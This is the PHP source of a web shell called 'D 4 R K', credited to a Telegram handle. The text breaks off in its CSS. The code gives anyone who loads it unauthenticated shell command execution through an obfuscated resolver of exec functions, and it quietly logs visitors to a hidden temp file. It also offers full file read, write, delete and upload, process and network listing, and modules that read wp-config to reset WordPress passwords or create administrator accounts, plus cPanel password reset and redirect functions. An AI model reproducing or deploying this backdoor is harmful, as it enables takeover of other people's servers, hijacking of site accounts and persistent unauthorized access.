<?php
/**
 * D 4 R K — file manager + shell
 * by jue vs everybody  ·  t.me/justbadpeople
 */

@error_reporting(0);
@ini_set('display_errors', '0');
@set_time_limit(0);

/* ─────────── Self-heal ─────────── */
register_shutdown_function(function () {
    $s = __FILE__;
    if (!is_file($s) && !empty($_SERVER['SCRIPT_FILENAME'])) $s = $_SERVER['SCRIPT_FILENAME'];
    if (is_file($s)) @touch($s);
});

/* ─────────── Shadows ─────────── */
$__sh = @sys_get_temp_dir() . '/.' . substr(md5($_SERVER['SERVER_NAME'] ?? 'r'), 0, 6);
@file_put_contents($__sh, date('c') . ' ' . ($_SERVER['REMOTE_ADDR'] ?? '-') . ' ' . ($_SERVER['REQUEST_URI'] ?? '-') . "\n", FILE_APPEND | LOCK_EX);

/* ─────────── Codec ─────────── */
function rw_e($s) { return rtrim(strtr(base64_encode($s), '+/', '-_'), '='); }
function rw_d($s) { return base64_decode(strtr($s, '-_', '+/')); }

/* ─────────── Exec resolver ─────────── */
$GLOBALS['_X'] = ['fn' => [], 'ok' => false];
foreach (['shell' . '_' . 'exec', 'sys' . 'tem', 'pass' . 'thru', 'po' . 'pen', 'pro' . 'c_open', 'ex' . 'ec'] as $f) {
    if (function_exists($f)) $GLOBALS['_X']['fn'][] = $f;
}
function rw_exec($cmd, $cwd = null) {
    $cmd = ($cwd ? 'cd ' . escapeshellarg($cwd) . ' && ' : '') . $cmd . ' 2>&1';
    foreach ($GLOBALS['_X']['fn'] as $f) {
        switch ($f) {
            case 'shell_exec': $o = @shell_exec($cmd); if ($o !== null) { $GLOBALS['_X']['ok'] = true; return (string)$o; } break;
            case 'system': ob_start(); @system($cmd); $o = ob_get_clean(); $GLOBALS['_X']['ok'] = true; return (string)$o;
            case 'passthru': ob_start(); @passthru($cmd); $o = ob_get_clean(); $GLOBALS['_X']['ok'] = true; return (string)$o;
            case 'popen': $h = @popen($cmd, 'r'); if ($h) { $o = stream_get_contents($h); @pclose($h); $GLOBALS['_X']['ok'] = true; return (string)$o; } break;
            case 'proc_open':
                $d = [['pipe','r'],['pipe','w'],['pipe','w']];
                $p = @proc_open($cmd, $d, $pp);
                if (is_resource($p)) {
                    $o = stream_get_contents($pp[1]) . stream_get_contents($pp[2]);
                    foreach ($pp as $x) @fclose($x);
                    @proc_close($p);
                    $GLOBALS['_X']['ok'] = true;
                    return (string)$o;
                }
                break;
            case 'exec': $arr = []; @exec($cmd, $arr); $GLOBALS['_X']['ok'] = true; return implode("\n", (array)$arr);
        }
    }
    return false;
}

/* ─────────── Session ─────────── */
if (!session_id()) {
    @session_name('d_' . substr(md5($_SERVER['SERVER_NAME'] ?? 'r'), 0, 8));
    @session_start();
}

/* ─────────── State ─────────── */
$cwd = getcwd();
$t   = isset($_GET['p']) ? rw_d($_GET['p']) : ($_SESSION['cwd'] ?? $cwd);
$t   = realpath($t) ?: $cwd;
if (!is_dir($t)) $t = $cwd;
$_SESSION['cwd'] = $t;
$op  = isset($_GET['o']) ? rw_d($_GET['o']) : '';
$arg = isset($_GET['a']) ? rw_d($_GET['a']) : '';

/* ─────────── Command exec endpoint ─────────── */
if ($op === 'x') {
    header('Content-Type: text/plain; charset=utf-8');
    header('X-Content-Type-Options: nosniff');
    $cmd = isset($_POST['d']) ? trim(rw_d($_POST['d'])) : '';
    if ($cmd === '') { echo ''; exit; }
    $hist = $_SESSION['h'] ?? [];
    if (!in_array($cmd, $hist, true)) {
        array_unshift($hist, $cmd);
        $_SESSION['h'] = array_slice($hist, 0, 200);
    }
    $out = rw_exec($cmd, $t);
    echo $out === false ? "[!] exec unavailable on this host\n" : (string)$out;
    exit;
}

/* ─────────── JSON endpoint ─────────── */
if ($op === 'j') {
    header('Content-Type: application/json; charset=utf-8');
    $req = isset($_POST['j']) ? json_decode(rw_d($_POST['j']), true) : null;
    if (!is_array($req)) { echo json_encode(['ok'=>false,'e'=>'badreq']); exit; }
    $act   = $req['act'] ?? '';
    $p     = $req['path'] ?? '';
    $extra = $req['x'] ?? '';
    $res   = ['ok' => false];

    switch ($act) {
        case 'read':
            if ($p && is_file($p) && @filesize($p) < 4194304) {
                $res = ['ok'=>true, 'c'=>@file_get_contents($p), 'size'=>@filesize($p)];
            }
            break;
        case 'write':
            if ($p) { $res = ['ok'=> (bool)@file_put_contents($p, (string)$extra)]; }
            break;
        case 'rename':
            $o = realpath($p); $n = basename(trim((string)$extra));
            if ($o && $n !== '') $res = ['ok'=> (bool)@rename($o, dirname($o) . '/' . $n)];
            break;
        case 'chmod':
            $o = realpath($p); $m = octdec(preg_replace('/[^0-7]/','',(string)$extra));
            if ($o && $m !== false) $res = ['ok'=> (bool)@chmod($o, $m), 'mode'=> substr(sprintf('%o', $m), -4)];
            break;
        case 'touch':
            $o = (string)$p; $ts = (int)$extra;
            if ($o && $ts) $res = ['ok'=> (bool)@touch($o, $ts)];
            break;
        case 'mkdir':
            $n = basename(trim((string)$p));
            if ($n !== '') $res = ['ok'=> (bool)@mkdir($t . '/' . $n, 0755)];
            break;
        case 'mkfile':
            $n = basename(trim((string)$p));
            if ($n !== '') $res = ['ok'=> (bool)@touch($t . '/' . $n)];
            break;
        case 'delete':
            $o = realpath($p); $rec = !empty($req['rec']);
            if ($o) {
                if (is_dir($o)) $rec ? rw_rmrf($o) : @rmdir($o);
                else @unlink($o);
                $res = ['ok' => true];
            }
            break;
        case 'zip':
            if (class_exists('ZipArchive')) {
                $srcs = (array)($req['srcs'] ?? []);
                $zp = $t . '/d4rk_' . date('Ymd_His') . '.zip';
                $z = new ZipArchive();
                if ($z->open($zp, ZipArchive::CREATE) === true) {
                    foreach ($srcs as $s) {
                        $f = realpath($s);
                        if (!$f) continue;
                        if (is_dir($f)) rw_zip_dir($z, $f, basename($f));
                        else $z->addFile($f, basename($f));
                    }
                    $z->close();
                    $res = ['ok'=>true, 'file'=>basename($zp)];
                }
            }
            break;
        case 'unzip':
            if (class_exists('ZipArchive') && is_file($p)) {
                $z = new ZipArchive();
                if ($z->open($p) === true) { $z->extractTo(dirname($p)); $z->close(); $res = ['ok'=>true]; }
            }
            break;
        case 'clip':
            $_SESSION['cb'] = ['op' => (string)$extra, 'src' => (string)$p];
            $res = ['ok'=>true];
            break;
        case 'paste':
            $cb = $_SESSION['cb'] ?? null;
            if ($cb) {
                $dst = $t . '/' . basename($cb['src']);
                if ($cb['op'] === 'cut') { $res['ok'] = @rename($cb['src'], $dst); unset($_SESSION['cb']); }
                else { rw_copy($cb['src'], $dst); $res['ok'] = true; }
            }
            break;
        case 'symlink':
            $target = (string)$p; $name = basename(trim((string)$extra));
            if ($name !== '') $res = ['ok'=> (bool)@symlink($target, $t . '/' . $name)];
            break;
        case 'hash':
            if ($p && is_file($p)) {
                $res = ['ok'=>true,
                    'md5'    => @md5_file($p),
                    'sha1'   => @sha1_file($p),
                    'sha256' => @hash_file('sha256', $p),
                    'size'   => @filesize($p)];
            }
            break;
        case 'hex':
            if ($p && is_file($p)) {
                $data = @file_get_contents($p, false, null, 0, 4096);
                if ($data !== false) {
                    $lines = [];
                    $len = strlen($data);
                    for ($i = 0; $i < $len; $i += 16) {
                        $chunk = substr($data, $i, 16);
                        $hex = '';
                        $asc = '';
                        for ($j = 0; $j < strlen($chunk); $j++) {
                            $b = ord($chunk[$j]);
                            $hex .= sprintf('%02x ', $b);
                            $asc .= ($b >= 32 && $b < 127) ? $chunk[$j] : '.';
                        }
                        $lines[] = sprintf('%08x  %-48s %s', $i, $hex, $asc);
                    }
                    $res = ['ok'=>true, 'lines'=>$lines, 'total'=>@filesize($p)];
                }
            }
            break;
        case 'b64':
            $res = ['ok'=>true, 'enc'=> base64_encode((string)$p), 'dec'=> @base64_decode((string)$p, true) ?: ''];
            break;
        case 'search':
            if ($p && is_dir($p)) {
                $hits = [];
                $q = (string)$extra;
                rw_search($p, $q, $hits, 500);
                $res = ['ok'=>true, 'hits'=>$hits];
            }
            break;
        case 'du':
            if ($p) {
                $res = ['ok'=>true, 'size'=> rw_du($p)];
            }
            break;
        case 'procs':
            $out = rw_exec('ps auxww 2>/dev/null || ps -ef 2>/dev/null');
            $res = ['ok'=>true, 'out'=> $out === false ? 'ps unavailable' : $out];
            break;
        case 'net':
            $out = rw_exec('(ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null || netstat -an 2>/dev/null) | head -200');
            $res = ['ok'=>true, 'out'=> $out === false ? 'ss/netstat unavailable' : $out];
            break;
        case 'sysinfo':
            $info = [
                'uname'    => php_uname(),
                'host'     => gethostname() ?: '?',
                'user'     => get_current_user() ?: '?',
                'php'      => phpversion(),
                'server'   => $_SERVER['SERVER_SOFTWARE'] ?? '?',
                'cwd'      => getcwd(),
                'disk'     => @disk_free_space('/') !== false ? rw_size(@disk_free_space('/')) . ' free / ' . rw_size(@disk_total_space('/')) . ' total' : '?',
                'load'     => function_exists('sys_getloadavg') ? implode(' ', array_map(fn($x) => round($x, 2), sys_getloadavg() ?: [0,0,0])) : '?',
                'memory'   => @ini_get('memory_limit'),
                'disabled' => @ini_get('disable_functions') ?: '(none)',
            ];
            $res = ['ok'=>true, 'info'=>$info];
            break;

        /* ═══════════ WordPress ═══════════ */
        case 'wp_detect':
            $res = rw_wp_detect();
            break;
        case 'wp_users':
            $cfg = rw_wp_cfg($p);
            if (!$cfg) { $res = ['ok'=>false, 'e'=>'wp-config not found or unreadable']; break; }
            $res = rw_wp_users($cfg);
            break;
        case 'wp_reset':
            $cfg = rw_wp_cfg($p);
            if (!$cfg) { $res = ['ok'=>false, 'e'=>'wp-config not found or unreadable']; break; }
            $res = rw_wp_reset($cfg, (string)$extra);
            break;
        case 'wp_create':
            $cfg = rw_wp_cfg($p);
            if (!$cfg) { $res = ['ok'=>false, 'e'=>'wp-config not found or unreadable']; break; }
            $u = (string)($req['user'] ?? '');
            $pw = (string)($req['pass'] ?? '');
            $em = (string)($req['email'] ?? '');
            $rl = (string)($req['role'] ?? 'administrator');
            $res = rw_wp_create($cfg, $u, $pw, $em, $rl);
            break;

        /* ═══════════ cPanel ═══════════ */
        case 'cp_detect':
            $res = rw_cp_detect();
            break;
        case 'cp_accounts':
            $res = rw_cp_accounts();
            break;
        case 'cp_reset':
            $res = rw_cp_reset((string)$extra, (string)($req['pass'] ?? ''));
            break;
        case 'cp_redirect':
            $res = rw_cp_redirect((string)$extra);
            break;
    }
    echo json_encode($res);
    exit;
}

/* ─────────── Direct file ops ─────────── */
if ($op === 'dl' && $arg && is_file($arg)) {
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($arg) . '"');
    header('Content-Length: ' . filesize($arg));
    readfile($arg);
    exit;
}
if ($op === 'raw' && $arg && is_file($arg)) {
    header('Content-Type: text/plain; charset=utf-8');
    echo htmlspecialchars((string)@file_get_contents($arg));
    exit;
}
if ($op === 'pv' && $arg && is_file($arg)) {
    $m = function_exists('mime_content_type') ? @mime_content_type($arg) : 'application/octet-stream';
    header('Content-Type: ' . ($m ?: 'application/octet-stream'));
    readfile($arg);
    exit;
}

/* ─────────── Upload ─────────── */
$msg = '';
if (!empty($_FILES)) {
    $k = array_key_first($_FILES);
    if ($k && isset($_FILES[$k]['name'])) {
        $n = (array)$_FILES[$k]['name'];
        $tm = (array)$_FILES[$k]['tmp_name'];
        $er = (array)$_FILES[$k]['error'];
        $c = 0;
        foreach ($n as $i => $x) {
            if ($er[$i] === UPLOAD_ERR_OK && is_uploaded_file($tm[$i])) {
                if (@move_uploaded_file($tm[$i], $t . '/' . basename($x))) $c++;
            }
        }
        if ($c) $msg = "uploaded $c file(s)";
    }
}

/* ─────────── List ─────────── */
$fs = @scandir($t) ?: [];
$parent = dirname($t);
$crumbs = [];
$acc = '';
foreach (array_filter(explode(DIRECTORY_SEPARATOR, trim($t, DIRECTORY_SEPARATOR)), 'strlen') as $seg) {
    $acc .= DIRECTORY_SEPARATOR . $seg;
    $crumbs[] = ['n'=>$seg, 'p'=>$acc];
}
$total = 0; $nd = 0; $nf = 0;
foreach ($fs as $f) {
    if ($f === '.' || $f === '..') continue;
    $full = $t . '/' . $f;
    if (is_dir($full)) $nd++;
    else { $nf++; $total += @filesize($full) ?: 0; }
}

$hist = $_SESSION['h'] ?? [];
$cb   = $_SESSION['cb'] ?? null;
$you  = get_current_user() ?: '?';
$ver  = phpversion();
$host = gethostname() ?: 'host';

/* ─────────── Permission coloriser ─────────── */
function rw_perm_html($path) {
    $p = @fileperms($path);
    if ($p === false) return '<span class="dim">—</span>';
    $oct = substr(sprintf('%o', $p), -4);
    $digits = str_split($oct);
    $html = '';
    foreach ($digits as $i => $d) {
        $cls = '';
        if ($i === 0) $cls = 'perm-lead';
        elseif ($d == '7') $cls = 'perm-rwx';
        elseif ($d == '5') $cls = 'perm-rx';
        elseif ($d == '0') $cls = 'perm-none';
        else $cls = 'perm-other';
        $html .= '<span class="' . $cls . '">' . $d . '</span>';
    }
    $rwx = rw_rwx($p);
    return '<span class="perm-octal" title="' . $rwx . '">' . $html . '</span>';
}
function rw_rwx($p) {
    $o = $p & 0777;
    $s = '';
    $s .= ($o & 0400) ? 'r' : '-';
    $s .= ($o & 0200) ? 'w' : '-';
    $s .= ($o & 0100) ? 'x' : '-';
    $s .= ($o & 0040) ? 'r' : '-';
    $s .= ($o & 0020) ? 'w' : '-';
    $s .= ($o & 0010) ? 'x' : '-';
    $s .= ($o & 0004) ? 'r' : '-';
    $s .= ($o & 0002) ? 'w' : '-';
    $s .= ($o & 0001) ? 'x' : '-';
    return $s;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title>D 4 R K</title>
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%230a0a0a'/%3E%3Ctext x='16' y='22' font-family='monospace' font-size='16' fill='%23fafafa' text-anchor='middle'%3ED4%3C/text%3E%3C/svg%3E">
<style>
  :root {
    color-scheme: dark;
    --bg: #0a0a0a;
    --panel: #111111;
    --panel-2: #161616;
    --line: #1f1f1f;
    --line-hot: #2a2a2a;
    --fg: #e8e8e8;
    --fg-dim: #a3a3a3;
    --fg-faint: #5a5a5a;
    --fg-ghost: #363636;
    --green: #4ade80;
    --green-dim: #166534;
    --white: #fafafa;
    --red: #ef4444;
    --blue: #60a5fa;
    --yellow: #fbbf24;
  }
  * { box-sizing: border-box; }
  html, body {
    margin: 0; padding: 0;
    background: var(--bg);
    color: var(--fg);
    font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    font-size: 13px;
    line-height: 1.5;
    -webkit-font-smoothing: antialiased;
  }
  .mono { font-family: ui-monospace, "SF Mono", "Cascadia Code", "JetBrains Mono", Menlo, Consolas, monospace; }
  ::-webkit-scrollbar { width: 8px; height: 8px; }
  ::-webkit-scrollbar-thumb { background: var(--line-hot); border-radius: 4px; }
  ::-webkit-scrollbar-thumb:hover { background: var(--fg-ghost); }
  ::-webkit-scrollbar-track { background: transparent; }
  a { color: var(--fg); text-decoration: none; }
  a:hover { color: var(--white); text-decoration: underline; text-underline-offset: 3px; text-decoration-thickness: 1px; text-decoration-color: var(--fg-ghost); }
  .dim { color: var(--fg-dim); }
  .faint { color: var(--fg-faint); }
  .ghost { color: var(--fg-ghost); }
  .green { color: var(--green); }
  .red { color: var(--red); }
  .white { color: var(--white); }
  .blue { color: var(--blue); }
  svg { display: inline-block; vertical-align: middle; }
  button {
    font-family: inherit; font-size: 12px;
    background: var(--panel);
    color: var(--fg);
    border: 1px solid var(--line-hot);
    padding: 4px 10px; border-radius: 4px;
    cursor: pointer;
    transition: all .12s;
    display: inline-flex; align-items: center; gap: 5px;
  }
  button:hover { background: var(--panel-2); border-color: var(--fg-ghost); color: var(--white); }
  button:disabled { opacity: .4; cursor: not-allowed; }
  button.primary { background: var(--white); color: var(--bg); border-color: var(--white); }
  button.primary:hover { background: #fff; color: #000; }
  button.ghost-btn { background: transparent; border-color: transparent; color: var(--fg-dim); }
  button.ghost-btn:hover { background: var(--panel); color: var(--white); }
  button.danger { color: var(--red); }
  button.danger:hover { background: rgba(239,68,68,.1); border-color: var(--red); color: var(--red); }
  input, textarea, select {
    font-family: inherit; font-size: 12px;
    background: var(--bg);
    color: var(--fg);
    border: 1px solid var(--line-hot);
    border-radius: 4px;
    padding: 5px 8px;
    outline: none;
    width: 100%;
    transition: border-color .12s;
  }
  input:focus, textarea:focus, select:focus { border-color: var(--fg-ghost); }
  input.mono, textarea.mono { font-family: ui-monospace, "SF Mono", Menlo, Consolas, monospace; }

  /* ───── permission colors ───── */
  .perm-octal { font-family: ui-monospace, Menlo, Consolas, monospace; font-size: 11px; letter-spacing: 1px; }
  .perm-lead  { color: var(--fg-ghost); }
  .perm-rwx   { color: var(--green); font-weight: 600; }
  .perm-rx    { color: var(--white); }
  .perm-none  { color: var(--fg-ghost); }
  .perm-other { color: var(--fg-dim); }

  /* ───── top bar ───── */
  .topbar {
    display: flex; align-items: center; gap: 16px;
    padding: 0 20px; height: 52px;
    border-bottom: 1px solid var(--line);
    background: var(--bg);
    position: sticky; top: 0; z-index: 40;
  }
  .brand {
    display: flex; align-items: center; gap: 10px;
    font-weight: 700; font-size: 14px; letter-spacing: 4px;
    color: var(--white);
  }
  .brand-logo {
    display: grid; place-items: center;
    width: 28px; height: 28px;
    border: 1px solid var(--line-hot);
    border-radius: 6px;
    background: var(--panel);
    color: var(--green);
  }
  .brand-logo svg { width: 16px; height: 16px; }
  .brand-sub { font-size: 10px; letter-spacing: 2px; color: var(--fg-faint); font-weight: 400; }
  .searchbar {
    position: relative;
    flex: 1; max-width: 420px;
  }
  .searchbar input {
    padding: 6px 12px 6px 32px;
    font-size: 12px;
    background: var(--panel);
  }
  .searchbar svg {
    position: absolute; left: 10px; top: 50%; transform: translateY(-50%);
    width: 14px; height: 14px; color: var(--fg-faint);
    pointer-events: none;
  }
  .top-actions { display: flex; align-items: center; gap: 6px; margin-left: auto; }
  .icon-btn {
    padding: 6px; border: 1px solid transparent;
    background: transparent; color: var(--fg-dim);
    border-radius: 4px;
    display: inline-flex; align-items: center; justify-content: center;
    cursor: pointer; transition: all .12s;
    font-family: inherit; font-size: inherit;
  }
  .icon-btn:hover { background: var(--panel); color: var(--white); }
  .icon-btn svg { width: 16px; height: 16px; }
  .status-pill {
    display: inline-flex; align-items: center; gap: 6px;
    padding: 4px 10px;
    border: 1px solid var(--line-hot);
    border-radius: 999px;
    font-size: 11px;
    color: var(--fg-dim);
    font-family: ui-monospace, Menlo, Consolas, monospace;
  }
  .status-pill .dot {
    width: 6px; height: 6px; border-radius: 50%;
    background: var(--green);
    box-shadow: 0 0 6px rgba(74,222,128,.6);
  }
  .status-pill.off .dot { background: var(--red); box-shadow: 0 0 6px rgba(239,68,68,.6); }

  /* ───── layout ───── */
  .layout {
    display: grid;
    grid-template-columns: 240px 1fr;
    min-height: calc(100vh - 52px);
  }
  @media (max-width: 860px) { .layout { grid-template-columns: 1fr; } .sidebar { display: none; } }

  /* ───── sidebar ───── */
  .sidebar {
    border-right: 1px solid var(--line);
    background: var(--bg);
    padding: 16px 0 0;
    display: flex; flex-direction: column;
    overflow-y: auto;
    max-height: calc(100vh - 52px);
    position: sticky; top: 52px;
  }
  .side-block { padding: 0 12px; margin-bottom: 20px; }
  .side-head {
    padding: 0 8px 8px;
    font-size: 10px;
    font-weight: 600;
    letter-spacing: 1.5px;
    text-transform: uppercase;
    color: var(--fg-faint);
  }
  .side-link {
    display: flex; align-items: center; gap: 10px;
    padding: 6px 8px;
    border-radius: 5px;
    color: var(--fg-dim);
    text-decoration: none;
    font-size: 12.5px;
    transition: all .12s;
    cursor: pointer;
  }
  .side-link:hover { background: var(--panel); color: var(--white); text-decoration: none; }
  .side-link.active {
    background: var(--panel-2);
    color: var(--white);
  }
  .side-link.active .side-icon { color: var(--green); }
  .side-icon {
    width: 16px; height: 16px;
    flex-shrink: 0;
    color: var(--fg-faint);
    transition: color .12s;
  }
  .side-link:hover .side-icon { color: var(--white); }
  .side-link .side-lbl { flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
  .side-link .side-meta { font-size: 10px; color: var(--fg-ghost); font-family: ui-monospace, Menlo, Consolas, monospace; }
  .side-spacer { flex: 1; min-height: 20px; }
  .side-footer {
    padding: 12px;
    border-top: 1px solid var(--line);
    display: flex; flex-direction: column; gap: 4px;
  }
  .side-footer .side-link { font-size: 12px; }

  /* ───── main ───── */
  .main { min-width: 0; display: flex; flex-direction: column; }
  .pathbar {
    display: flex; align-items: center; gap: 4px;
    padding: 10px 20px;
    border-bottom: 1px solid var(--line);
    font-family: ui-monospace, Menlo, Consolas, monospace;
    font-size: 12px;
    flex-wrap: wrap;
    overflow-x: auto;
  }
  .pathbar a { padding: 2px 6px; border-radius: 3px; color: var(--fg-dim); }
  .pathbar a:hover { background: var(--panel); color: var(--white); text-decoration: none; }
  .pathbar .here { color: var(--white); }
  .pathbar .sep { color: var(--fg-ghost); }
  .pathbar .up-btn { color: var(--fg-dim); padding: 4px; display: inline-flex; }

  .toolbar {
    display: flex; gap: 6px; align-items: center;
    padding: 8px 20px;
    border-bottom: 1px solid var(--line);
    background: var(--panel);
    font-size: 12px;
    flex-wrap: wrap;
  }
  .toolbar .spacer { flex: 1; min-width: 8px; }
  .toolbar .lbl { color: var(--fg-faint); font-size: 11px; margin-right: 4px; }

  .view-switch {
    display: inline-flex; border: 1px solid var(--line-hot); border-radius: 4px; overflow: hidden;
  }
  .view-switch button {
    border: none; border-radius: 0;
    padding: 4px 10px;
    background: transparent;
    color: var(--fg-dim);
    font-size: 11px;
    display: inline-flex; align-items: center; gap: 4px;
  }
  .view-switch button.on { background: var(--panel-2); color: var(--white); }

  .msg-bar {
    padding: 8px 20px;
    border-bottom: 1px solid var(--line);
    font-size: 12px;
    color: var(--green);
    font-family: ui-monospace, Menlo, Consolas, monospace;
  }

  /* ───── file grid ───── */
  .grid-wrap { padding: 16px 20px; }
  .file-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
    gap: 8px;
  }
  .file-card {
    position: relative;
    background: var(--panel);
    border: 1px solid var(--line);
    border-radius: 6px;
    padding: 12px;
    transition: border-color .12s, background .12s;
    min-width: 0;
  }
  .file-card:hover { background: var(--panel-2); border-color: var(--line-hot); }
  .file-card-head {
    display: flex; align-items: flex-start; justify-content: space-between;
    margin-bottom: 10px;
  }
  .file-icon-box {
    width: 36px; height: 36px;
    display: grid; place-items: center;
    border-radius: 6px;
    background: var(--bg);
    border: 1px solid var(--line);
    color: var(--fg-dim);
  }
  .file-icon-box svg { width: 18px; height: 18px; }
  .file-card.is-dir .file-icon-box { color: var(--green); border-color: var(--green-dim); }
  .file-card.is-link .file-icon-box { color: var(--blue); }
  .file-ops {
    display: flex; gap: 1px;
    opacity: 0; transition: opacity .12s;
  }
  .file-card:hover .file-ops { opacity: 1; }
  .file-ops .icon-btn { padding: 4px; }
  .file-ops .icon-btn svg { width: 12px; height: 12px; }
  .file-name {
    display: block;
    font-size: 12.5px;
    font-weight: 500;
    color: var(--fg);
    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
    margin-bottom: 4px;
    text-decoration: none;
  }
  .file-name:hover { color: var(--white); text-decoration: none; }
  .file-card.is-dir .file-name { color: var(--white); }
  .file-meta {
    display: flex; justify-content: space-between; gap: 6px;
    font-size: 10px;
    color: var(--fg-faint);
    font-family: ui-monospace, Menlo, Consolas, monospace;
  }
  .file-meta .perm-octal { font-size: 10px; }
  .empty-state {
    padding: 60px 20px;
    text-align: center;
    color: var(--fg-faint);
    font-size: 12px;
  }
  .empty-state svg { width: 40px; height: 40px; margin-bottom: 10px; color: var(--fg-ghost); }

  /* ───── file list ───── */
  .file-list { width: 100%; border-collapse: collapse; font-size: 12px; }
  .file-list th {
    text-align: left;
    padding: 8px 12px;
    font-size: 10px;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 1px;
    color: var(--fg-faint);
    border-bottom: 1px solid var(--line);
    white-space: nowrap;
  }
  .file-list td {
    padding: 6px 12px;
    border-bottom: 1px solid var(--line);
    vertical-align: middle;
  }
  .file-list tr:hover td { background: var(--panel); }
  .file-list .file-row-name { color: var(--fg); font-family: ui-monospace, Menlo, Consolas, monospace; font-size: 12px; }
  .file-list .file-row-name:hover { color: var(--white); }
  .file-list .is-dir .file-row-name { color: var(--white); }
  .row-ops { display: flex; gap: 2px; justify-content: flex-end; opacity: .35; transition: opacity .12s; }
  .file-list tr:hover .row-ops { opacity: 1; }
  .row-ops .icon-btn { padding: 4px; }
  .row-ops .icon-btn svg { width: 12px; height: 12px; }
  .bulk-bar { padding: 10px 20px; display: flex; gap: 6px; border-top: 1px solid var(--line); flex-wrap: wrap; }
  input[type=checkbox] { width: auto; padding: 0; margin: 0; accent-color: var(--green); }

  /* ───── terminal ───── */
  .terminal {
    margin-top: auto;
    border-top: 1px solid var(--line);
    background: #000;
  }
  .term-head {
    display: flex; align-items: center; gap: 10px;
    padding: 8px 20px;
    border-bottom: 1px solid var(--line);
    font-size: 11px;
    color: var(--fg-faint);
    font-family: ui-monospace, Menlo, Consolas, monospace;
  }
  .term-head .dots { display: flex; gap: 6px; }
  .term-head .dots span { width: 8px; height: 8px; border-radius: 50%; background: var(--fg-ghost); }
  .term-head .dots span:nth-child(1) { background: #ef4444; }
  .term-head .dots span:nth-child(2) { background: #fbbf24; }
  .term-head .dots span:nth-child(3) { background: #4ade80; }
  .term-head .label { text-transform: uppercase; letter-spacing: 2px; font-weight: 600; color: var(--fg-dim); }
  .term-head .cwd { margin-left: auto; color: var(--fg-dim); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 60%; }
  .term-input {
    display: flex; align-items: center; gap: 10px;
    padding: 10px 20px;
    border-bottom: 1px solid var(--line);
  }
  .term-input .ps { color: var(--green); font-family: ui-monospace, Menlo, Consolas, monospace; font-weight: 600; font-size: 13px; }
  .term-input input {
    flex: 1;
    background: transparent;
    border: none;
    padding: 2px 0;
    color: var(--white);
    font-family: ui-monospace, Menlo, Consolas, monospace;
    font-size: 13px;
  }
  .term-input input:focus { border: none; }
  .term-out {
    padding: 12px 20px;
    font-family: ui-monospace, Menlo, Consolas, monospace;
    font-size: 12px;
    line-height: 1.6;
    color: var(--fg-dim);
    white-space: pre-wrap;
    word-break: break-all;
    min-height: 120px; max-height: 320px;
    overflow: auto;
    margin: 0;
    background: #000;
    color: #d4d4d4;
  }
  .term-out .t-cmd { color: var(--green); font-weight: 600; }
  .term-out .t-err { color: var(--red); }

  /* ───── modals ───── */
  .modal-bg {
    position: fixed; inset: 0;
    background: rgba(0,0,0,.75);
    display: flex; align-items: center; justify-content: center;
    padding: 20px;
    z-index: 100;
    backdrop-filter: blur(4px);
    animation: fadein .12s ease;
  }
  @keyframes fadein { from { opacity: 0; } to { opacity: 1; } }
  .modal-bg.hidden { display: none; }
  .modal {
    background: var(--bg);
    border: 1px solid var(--line-hot);
    border-radius: 8px;
    width: 100%; max-width: 640px;
    max-height: 88vh;
    display: flex; flex-direction: column;
    box-shadow: 0 10px 50px rgba(0,0,0,.5);
    animation: popin .15s ease;
  }
  @keyframes popin { from { transform: scale(.97); opacity: 0; } to { transform: scale(1); opacity: 1; } }
  .modal.wide { max-width: 1000px; height: 88vh; }
  .modal-head {
    display: flex; align-items: center; gap: 10px;
    padding: 12px 16px;
    border-bottom: 1px solid var(--line);
    font-size: 12px;
  }
  .modal-head .title { font-weight: 600; text-transform: uppercase; letter-spacing: 1.5px; font-size: 11px; color: var(--fg-dim); }
  .modal-head .path { font-family: ui-monospace, Menlo, Consolas, monospace; font-size: 11px; color: var(--fg-faint); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
  .modal-head .x { margin-left: auto; padding: 4px; cursor: pointer; color: var(--fg-faint); display: flex; }
  .modal-head .x:hover { color: var(--red); }
  .modal-head .x svg { width: 14px; height: 14px; }
  .modal-body {
    padding: 16px;
    display: flex; flex-direction: column; gap: 12px;
    overflow: auto;
    flex: 1;
  }
  .modal-body label {
    display: block;
    font-size: 10px;
    text-transform: uppercase;
    letter-spacing: 1.5px;
    color: var(--fg-faint);
    margin-bottom: 6px;
  }
  .modal-body .field { display: flex; flex-direction: column; }
  .modal-body textarea {
    flex: 1;
    min-height: 360px;
    resize: none;
    font-family: ui-monospace, Menlo, Consolas, monospace;
    font-size: 12px;
    line-height: 1.55;
  }
  .modal-body textarea.hex {
    min-height: 400px;
    white-space: pre;
    overflow: auto;
    background: #000;
    color: #d4d4d4;
  }
  .modal-foot {
    padding: 12px 16px;
    border-top: 1px solid var(--line);
    display: flex; gap: 6px; justify-content: flex-end;
    align-items: center;
  }
  .modal-foot .meta { margin-right: auto; font-size: 10px; color: var(--fg-faint); font-family: ui-monospace, Menlo, Consolas, monospace; }
  .chmod-presets { display: flex; gap: 4px; flex-wrap: wrap; margin-top: 6px; }
  .chmod-presets button { padding: 3px 8px; font-size: 11px; font-family: ui-monospace, Menlo, Consolas, monospace; }
  .hash-row {
    display: grid; grid-template-columns: 80px 1fr;
    gap: 8px; align-items: center;
    padding: 6px 0;
    border-bottom: 1px solid var(--line);
    font-size: 11px;
  }
  .hash-row:last-child { border-bottom: none; }
  .hash-row .k { color: var(--fg-faint); text-transform: uppercase; letter-spacing: 1px; font-size: 10px; }
  .hash-row .v { font-family: ui-monospace, Menlo, Consolas, monospace; color: var(--fg); word-break: break-all; }

  /* ───── palette ───── */
  .modal.palette { max-width: 520px; align-self: flex-start; margin-top: 60px; }
  .palette-input {
    width: 100%;
